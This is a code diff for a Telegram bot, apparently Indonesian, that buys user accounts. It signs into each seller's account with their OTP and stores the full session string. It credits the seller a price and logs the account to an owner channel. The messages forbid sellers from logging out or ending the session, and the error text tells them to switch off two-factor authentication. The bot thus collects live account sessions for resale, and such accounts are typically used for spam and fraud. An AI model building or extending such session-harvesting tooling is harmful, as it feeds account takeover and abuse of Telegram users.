@@ -146,58 +146,55 @@ bot.on('text', async (ctx) => {
 
     // STEP 2: OTP
     else if (state.step === 'input_otp') {
-        const otp = text.replace(/\s+/g, '');
-        const msg = await ctx.replyWithHTML('<blockquote>🔐 <b>MENVERIFIKASI...</b></blockquote>');
-        await drawLoading(ctx, msg.message_id, "Sinkronisasi Sesi");
+    const otp = text.replace(/\s+/g, '');
+    const msg = await ctx.replyWithHTML('<blockquote>🔐 <b>MENVERIFIKASI...</b></blockquote>');
+    await drawLoading(ctx, msg.message_id, "Sinkronisasi Sesi");
 
-        try {
-            const client = state.client;
-            await client.invoke(new Api.auth.SignIn({
-                phoneNumber: state.phone,
-                phoneCodeHash: state.phoneCodeHash,
-                phoneCode: otp
-            }));
+    try {
+        const client = state.client;
+        await client.invoke(new Api.auth.SignIn({
+            phoneNumber: state.phone,
+            phoneCodeHash: state.phoneCodeHash,
+            phoneCode: otp
+        }));
 
-            const sessionStr = client.session.save();
-            const harga = state.phone.startsWith('1') ? db.settings.harga_plus : db.settings.harga_biasa;
+        const sessionStr = client.session.save();
+        const harga = state.phone.startsWith('1')
+            ? db.settings.harga_plus
+            : db.settings.harga_biasa;
 
-            db.accounts.push({
-    phone: state.phone, 
-    session: sessionStr,
-    sellerId: userId, 
-    sellerName: ctx.from.first_name, 
-    date: new Date().toLocaleString()
-});
+        db.accounts.push({
+            phone: state.phone,
+            session: sessionStr,
+            sellerId: userId,
+            sellerName: ctx.from.first_name,
+            date: new Date().toLocaleString()
+        });
 
+        if (!db.users[userId]) db.users[userId] = { balance: 0 };
+        db.users[userId].balance += harga;
+        saveData(db);
 
-            if (!db.users[userId]) db.users[userId] = { balance: 0 };
-db.users[userId].balance += harga;
-saveData(db);
-
-// === PESAN KE USER (PENJUALAN + S&K) ===
-await ctx.replyWithHTML(
-    `<blockquote>✅ <b>PENJUALAN BERHASIL!</b>
+        // PESAN USER
+        await ctx.replyWithHTML(
+            `<blockquote>✅ <b>PENJUALAN BERHASIL!</b>
 ━━━━━━━━━━━━━━━━
 📱 No: <code>${state.phone}</code>
 💰 Bonus: +Rp ${harga.toLocaleString()}
 💳 Total Saldo: <b>Rp ${db.users[userId].balance.toLocaleString()}</b>
 
-⚠️ <b>PERINGATAN PENTING (S&K)</b>
-❌ DILARANG LOGOUT akun Telegram setelah dijual
-❌ Jangan hapus sesi / ganti perangkat
+⚠️ <b>PERINGATAN PENTING</b>
+❌ DILARANG LOGOUT akun Telegram
+❌ Jangan hapus sesi / ganti device
 
-Pelanggaran dapat menyebabkan:
-• Bot error / mental
-• Saldo <b>DITAHAN / DIBATALKAN</b>
+<b>AKUN FINAL & TIDAK BISA DIBATALKAN</b></blockquote>`,
+            mainBtn()
+        );
 
-<b>AKUN YANG SUDAH DIJUAL BERSIFAT FINAL</b></blockquote>`,
-    mainBtn()
-);
-
-// === PESAN KE CHANNEL LOG (DETAIL) ===
-await bot.telegram.sendMessage(
-    logChannel,
-    `<blockquote>✅ <b>AKUN MASUK</b>
+        // LOG CHANNEL
+        await bot.telegram.sendMessage(
+            logChannel,
+            `<blockquote>✅ <b>AKUN MASUK</b>
 ━━━━━━━━━━━━━━━━
 👤 User: ${ctx.from.first_name}
 🆔 ID: <code>${userId}</code>
@@ -205,10 +202,23 @@ await bot.telegram.sendMessage(
 💰 Harga: Rp ${harga.toLocaleString()}
 💳 Saldo User: Rp ${db.users[userId].balance.toLocaleString()}
 ⏰ Waktu: ${new Date().toLocaleString()}</blockquote>`,
-    { parse_mode: 'HTML' }
-);
+            { parse_mode: 'HTML' }
+        );
 
-await client.disconnect();
+        await client.disconnect();
+    } catch (err) {
+        await ctx.replyWithHTML(
+            `<blockquote>❌ <b>GAGAL LOGIN</b>
+${err.message}
+Pastikan:
+• OTP benar
+• 2FA mati</blockquote>`,
+            mainBtn()
+        );
+    }
+
+    delete userSessions[userId];
+}
 
     // SET HARGA BIASA
     else if (state.step === 'set_harga_biasa' && userId === ownerId) {
